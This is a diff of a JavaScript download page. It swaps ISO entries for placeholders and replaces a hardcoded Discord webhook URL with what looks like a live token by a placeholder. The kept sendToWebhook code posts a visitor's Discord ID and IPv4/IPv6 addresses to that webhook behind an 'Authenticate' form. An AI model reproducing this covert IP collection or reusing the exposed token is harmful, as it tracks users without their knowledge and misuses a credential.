@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
   const isoFiles = [
-    { name: 'Ubuntu 20.04', size: '2.5 GB', url: 'https://example.com/ubuntu.iso' },
-    { name: 'Fedora 33', size: '1.8 GB', url: 'https://example.com/fedora.iso' }
+    { name: 'comming soon', size: '？', url: 'comming soon' },
+    { name: 'comming soon', size: '？', url: 'comming soon' }
   ];
 
   const isoList = document.getElementById('iso-list');
@@ -15,14 +15,7 @@ document.addEventListener('DOMContentLoaded', () => {
     isoList.appendChild(li);
   });
 
-  const authForm = document.createElement('form');
-  authForm.id = 'auth-form';
-  authForm.innerHTML = `
-    <input type="text" id="discord-id" placeholder="Discord ID" required>
-    <button type="submit" class="submit-button">Authenticate</button>
-  `;
-  document.body.insertBefore(authForm, document.body.firstChild);
-
+  const authForm = document.getElementById('auth-form');
   authForm.addEventListener('submit', async (event) => {
     event.preventDefault();
     const discordID = document.getElementById('discord-id').value;
@@ -46,7 +39,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   function sendToWebhook(discordID, ipv4, ipv6) {
-    const webhookURL = 'https://discord.com/api/webhooks/1290225314022031402/7JCLF2tHFCNnmAO-7xZ1UtQbOJILBkclyGfxt3KYI7buXWMvV-ND6_607i6WzdeJ2Ycy'; // あなたのWebhook URLを入力
+    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; 
     const payload = {
       content: `Discord ID: ${discordID}\nIPv4: ${ipv4}\nIPv6: ${ipv6}`
     };
